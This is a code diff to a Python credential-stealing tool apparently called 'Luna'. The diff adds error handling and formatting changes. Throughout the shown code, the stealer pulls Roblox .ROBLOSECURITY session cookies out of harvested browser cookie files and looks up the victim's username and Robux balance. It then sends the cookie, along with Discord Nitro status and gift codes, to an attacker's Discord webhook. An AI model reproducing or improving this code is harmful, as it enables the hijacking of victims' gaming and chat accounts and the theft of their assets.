@@ -305,19 +305,22 @@ class Discord:
                                     self.ids.append(uid)
 
     def robloxinfo(self, webhook):
-        embed = Embed(title="Roblox Info", color=5639644)
-        headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
-        info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
+        if robo_cookie == "No Roblox Cookies Found":
+            pass
+        else:
+            embed = Embed(title="Roblox Info", color=5639644)
+            headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
+            info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
 
-        embed.add_field(name="<:roblox_icon:1041819334969937931> Name:", value=f"`{info['UserName']}`", inline=True)
-        embed.add_field(name="<:robux_coin:1041813572407283842> Robux:", value=f"`{info['RobuxBalance']}`", inline=True)
-        embed.add_field(name="🍪 Cookie:", value=f"`{robo_cookie}`", inline=False)
-        embed.set_thumbnail(url=info['ThumbnailUrl'])
+            embed.add_field(name="<:roblox_icon:1041819334969937931> Name:", value=f"`{info['UserName']}`", inline=True)
+            embed.add_field(name="<:robux_coin:1041813572407283842> Robux:", value=f"`{info['RobuxBalance']}`", inline=True)
+            embed.add_field(name="🍪 Cookie:", value=f"`{robo_cookie}`", inline=False)
+            embed.set_thumbnail(url=info['ThumbnailUrl'])
 
-        webhook.send(
-            avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
-            embed=embed,
-            username="Luna")
+            webhook.send(
+                avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+                embed=embed,
+                username="Luna")
 
     def upload(self, webhook):
         webhook = SyncWebhook.from_url(webhook, session=requests.Session())
@@ -353,11 +356,11 @@ class Discord:
             if user['premium_type'] == 0:
                 nitro = "❌"
             elif user['premium_type'] == 1:
-                nitro = 'Nitro Classic'
+                nitro = '`Nitro Classic`'
             elif user['premium_type'] == 2:
-                nitro = 'Nitro'
+                nitro = '`Nitro`'
             elif user['premium_type'] == 3:
-                nitro = 'Nitro Basic'
+                nitro = '`Nitro Basic`'
             else:
                 nitro = "❌"
 
@@ -393,8 +396,8 @@ class Discord:
                 for c, t in val_codes:
                     val += f'\n:gift: **{t}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
 
-            embed = Embed(title="Discord", color=5639644)
-            embed.add_field(name=username, value=val + "\u200b", inline=False)
+            embed = Embed(title={username}, color=5639644)
+            embed.add_field(name="\u200b", value=val + "\u200b", inline=False)
             embed.set_thumbnail(url=avatar)
 
             webhook.send(
@@ -580,13 +583,13 @@ class Browsers:
         with open(os.path.join(tempfolder, "Roblox", "Roblox Cookies.txt"), 'w', encoding="utf-8") as f:
             f.write(f"{github} | Roblox Cookies\n\n")
             with open(os.path.join(tempfolder, "Browser", "Browser Cookies.txt"), 'r', encoding="utf-8") as f2:
-                for line in f2:
-                    if ".ROBLOSECURITY" in line:
-                        robo_cookie = line.split(".ROBLOSECURITY")[1].strip()
-                        f.write(robo_cookie + "\n")
-                    else:
-                        robo_cookie = "No Roblox Cookies Found"
-                        f.write(robo_cookie)
+                try:
+                    for line in f2:
+                        if ".ROBLOSECURITY" in line:
+                            robo_cookie = line.split(".ROBLOSECURITY")[1].strip()
+                            f.write(robo_cookie + "\n")
+                except Exception:
+                    robo_cookie = "No Roblox Cookies Found"
             f2.close()
         f.close()
 
